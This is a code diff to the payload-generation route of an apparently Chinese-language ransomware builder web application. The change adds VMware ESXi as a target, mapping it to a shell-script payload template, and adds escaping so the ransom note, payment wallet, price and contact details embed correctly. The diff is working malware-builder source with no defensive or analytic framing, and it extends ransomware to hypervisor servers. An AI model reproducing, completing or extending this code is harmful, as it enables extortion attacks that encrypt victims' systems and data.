@@ -216,12 +216,12 @@ def generate():
         'price': request.form.get('ransom_price',''),
         'wallet': request.form.get('ransom_wallet',''),
     }
-    if plat not in ('win','linux','macos'):
+    if plat not in ('win','linux','macos','esxi'):
         return jsonify(ok=False, msg='无效平台')
     ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
     tok = secrets.token_hex(4)
-    tpl_map = {'win':'win_payload.tpl','linux':'linux_payload.tpl','macos':'macos_payload.tpl'}
-    ext_map = {'win':'.cs','linux':'.py','macos':'.py'}
+    tpl_map = {'win':'win_payload.tpl','linux':'linux_payload.tpl','macos':'macos_payload.tpl','esxi':'esxi_payload.tpl'}
+    ext_map = {'win':'.cs','linux':'.py','macos':'.py','esxi':'.sh'}
     tpl_path = os.path.join(TEMPLATE_DIR, tpl_map[plat])
     if not os.path.exists(tpl_path):
         return jsonify(ok=False, msg='模板文件缺失')
@@ -239,9 +239,15 @@ def generate():
     if ransom['wallet']: note += f"\n💳 支付地址: {ransom['wallet']}"
     if ransom['contact']: note += f"\n📧 {ransom['contact']}"
     note += f"\n\n🔓 解密方法:\n{dec}\n\n✅ SHA-256 校验确保文件100%还原"
-    tpl = tpl.replace('{{RANSOM_NOTE}}', note.replace("'","\\'").replace('"','\\"'))
-    for k,v in ransom.items():
-        tpl = tpl.replace('{{RANSOM_'+k.upper()+'}}', v.replace("'","\\'"))
+    if plat == 'esxi':
+        # sh 单引号字符串中用 '\'' 转义
+        tpl = tpl.replace('{{RANSOM_NOTE}}', note.replace("'","'\\''"))
+        for k,v in ransom.items():
+            tpl = tpl.replace('{{RANSOM_'+k.upper()+'}}', v.replace("'","'\\''"))
+    else:
+        tpl = tpl.replace('{{RANSOM_NOTE}}', note.replace("'","\\'").replace('"','\\"'))
+        for k,v in ransom.items():
+            tpl = tpl.replace('{{RANSOM_'+k.upper()+'}}', v.replace("'","\\'"))
     name = f'jasmin_{plat}_{ts}_{tok}{ext_map[plat]}'
     with open(os.path.join(PAYLOAD_DIR, name), 'w') as f: f.write(tpl)
     return jsonify(ok=True, file=name, platform=plat, size=os.path.getsize(os.path.join(PAYLOAD_DIR,name)))
